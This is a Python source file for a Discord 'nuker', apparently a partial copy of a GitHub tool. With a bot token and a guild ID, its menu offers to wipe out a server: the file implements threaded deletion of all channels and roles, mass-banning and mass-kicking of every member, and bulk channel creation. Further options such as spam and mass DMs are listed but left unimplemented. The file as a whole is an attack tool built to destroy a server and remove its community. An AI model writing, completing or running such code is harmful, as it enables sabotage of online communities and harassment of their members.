import sys
import os
import requests as req
import time
import json
from pystyle import *
from colorama import Fore
from threading import Thread
import asyncio
from random import choice as choisex

from Plugins.tools import Tools
from Plugins.nuking import Nuking
from Plugins.funcs import Funcs
from Plugins.colors import Palette

global_timeot = 0.0004
palette = Palette()
token = None
names = None
amount = None
guild_name = None
invite_link = None

info = None

async def main(token: str, guild_id):
    headers = {"Authorization": "Bot %s" % token, "Content-Type": 'application/json'}
    System.Clear()
    Funcs.print_logo()
    global info

    if not info:
        info = Tools.information(guild_id, token)

    menu = """
> github.com/Bad-Discord/Discord-Nuker

01. Delete All Channels    08. Webhook Spam Guild     15. Change Guild Icon
02. Delete All Roles       09. Message Spam Guild     16. Remove all emojis
03. Ban All Members        10. Rename all channels    17. DM all members
04. Kick All Members       11. Rename all roles       18. NUKE
05. Create Channels        12. Nick All Users         19. Exit
06. Create Roles           13. UnNick All users
07. Unban All Members      14. Change Guild Name


"""

    async def back_to_manu():
        input(f"{palette.error}\n!! IF YOU WANT TO RETURN TO THE MAIN MENU, PRESS ENTER !!{palette.fuck}\n")
        return await main(token, guild_id)

    nuker = Nuking(token, guild_id)

    print(Colorate.Vertical(Colors.DynamicMIX((Col.light_red, Col.red)), menu))
    num = lambda n: "0"+n if len(n) != 2 else n
    pu, re, bl, pi, ye, gr = Col.purple, Col.red, Col.blue, Col.pink, Fore.YELLOW, Fore.GREEN
    choice = Funcs.get_input(
        f"{Col.orange}┌─╼{re}[{palette.grassy_green}${re}] {Col.orange}{info['user']['username']}{palette.red}@{ye}{info['guild']['name']}\n"
        f"{Col.orange}└────╼{palette.grey} >>{palette.better_purpule} Choose: {Fore.CYAN}",
        checker=lambda x: x.isnumeric() and 0 < int(x) <= 19
    )
    choice = num(choice)

    print()

    if choice == "01":
        url = Tools.api("guilds/%s/channels" % guild_id)
        request = req.get(url, headers=headers, proxies=Tools.proxy())

        if request.status_code != 200:
            print(f"Failed to fetch channels with status code: {request.status_code}")
            return await back_to_manu()

        channels = [i["id"] for i in request.json()]

        def deleter(channel_id):
            if nuker.delete_channel(channel_id):
                print(f"Deleted channel {channel_id}")
            else:
                print(f"Failed to delete channel {channel_id}")

        print("Started deleting channels...")

        threads = []

        for channel in channels:
            t = Thread(target=deleter, args=(channel,))
            t.start()
            threads.append(t)
            time.sleep(global_timeot)
        else:
            for thread in threads:
                thread.join()
            return await back_to_manu()

    elif choice == "02":
        url = Tools.api("guilds/%s/roles" % guild_id)

        request = req.get(url, headers=headers)

        if request.status_code != 200:
            print(f"Failed to fetch roles with status code: {request.status_code}")
            return await back_to_manu()

        roles = [i["id"] for i in request.json()]

        def delete_role(role):
            status = nuker.delete_role(role)
            if status:
                print(f"Deleted role {role}")
            else:
                print(f"Failed to delete role {role}")

        print("Started deleting roles...")

        threads = []

        for role in roles:
            t = Thread(target=delete_role, args=(role,))
            t.start()
            threads.append(t)
            time.sleep(global_timeot)
        else:
            for thread in threads:
                thread.join()
            return await back_to_manu()

    elif choice == "03":
        api = Tools.api("/guilds/%s/members" % guild_id)
        users = await Tools.break_limit(api, token)

        total = len(users)
        members_per_arrary = round(total / 6)

        members_1, members_2, members_3, members_4, members_5, members_6 = [], [], [], [], [], []

        for member in users:
            if len(members_1) != members_per_arrary:
                members_1.append(member)
            elif len(members_2) != members_per_arrary:
                members_2.append(member)
            elif len(members_3) != members_per_arrary:
                members_3.append(member)
            elif len(members_4) != members_per_arrary:
                members_4.append(member)
            elif len(members_5) != members_per_arrary:
                members_5.append(member)
            elif len(members_6) != members_per_arrary:
                members_6.append(member)

        def ban(member):
            if nuker.ban(member):
                print(f"Successfully banned {member}")
            else:
                print(f"Failed to ban {member}")

        print("Started banning members...")

        while members_1 or members_2 or members_3 or members_4 or members_5 or members_6:

            if members_1:
                Thread(target=ban, args=(members_1.pop(0),)).start()

            if members_2:
                Thread(target=ban, args=(members_2.pop(0),)).start()

            if members_3:
                Thread(target=ban, args=(members_3.pop(0),)).start()

            if members_4:
                Thread(target=ban, args=(members_4.pop(0),)).start()

            if members_5:
                Thread(target=ban, args=(members_5.pop(0),)).start()

            if members_6:
                Thread(target=ban, args=(members_6.pop(0),)).start()

        return await back_to_manu()

    elif choice == "04":
        api = Tools.api("/guilds/%s/members" % guild_id)
        users = await Tools.break_limit(api, token)

        def kick(member):
            if nuker.kick(member):
                print(f"Successfully kicked {member}")
            else:
                print(f"Failed to kick {member}")

        total = len(users)
        members_per_arrary = round(total / 6)

        members_1, members_2, members_3, members_4, members_5, members_6 = [], [], [], [], [], []

        for member in users:
            if len(members_1) != members_per_arrary:
                members_1.append(member)
            elif len(members_2) != members_per_arrary:
                members_2.append(member)
            elif len(members_3) != members_per_arrary:
                members_3.append(member)
            elif len(members_4) != members_per_arrary:
                members_4.append(member)
            elif len(members_5) != members_per_arrary:
                members_5.append(member)
            elif len(members_6) != members_per_arrary:
                members_6.append(member)

        print("Started kicking members...")

        while members_1 or members_2 or members_3 or members_4 or members_5 or members_6:

            if members_1:
                Thread(target=kick, args=(members_1.pop(0),)).start()

            if members_2:
                Thread(target=kick, args=(members_2.pop(0),)).start()

            if members_3:
                Thread(target=kick, args=(members_3.pop(0),)).start()

            if members_4:
                Thread(target=kick, args=(members_4.pop(0),)).start()

            if members_5:
                Thread(target=kick, args=(members_5.pop(0),)).start()

            if members_6:
                Thread(target=kick, args=(members_6.pop(0),)).start()

        return await back_to_manu()

    elif choice == "05":
        # Assuming you want to create channels here - so prompt user for input properly
        name = Funcs.get_input("Enter a name for channels: ", lambda x: len(x) > 0)
        # You might want to add amount input too
        amount = int(Funcs.get_input("Enter the amount of channels to create: ", lambda x: x.isnumeric() and int(x) > 0))

        def create_channel(channel_name):
            if nuker.create_channel(channel_name):
                print(f"Created channel {channel_name}")
            else:
                print(f"Failed to create channel {channel_name}")

        print(f"Started creating {amount} channels named {name}...")

        threads = []

        for i in range(amount):
            channel_name = f"{name}-{i+1}"
            t = Thread(target=create_channel, args=(channel_name,))
            t.start()
            threads.append(t)
            time.sleep(global_timeot)

        for thread in threads:
            thread.join()

        return await back_to_manu()

    # You can continue implementing other choices similarly...

    elif choice == "19":
        print("Exiting...")
        sys.exit()

    else:
        print("Invalid choice!")
        return await back_to_manu()

# To run the async main function:
# Example:
# asyncio.run(main(token, guild_id))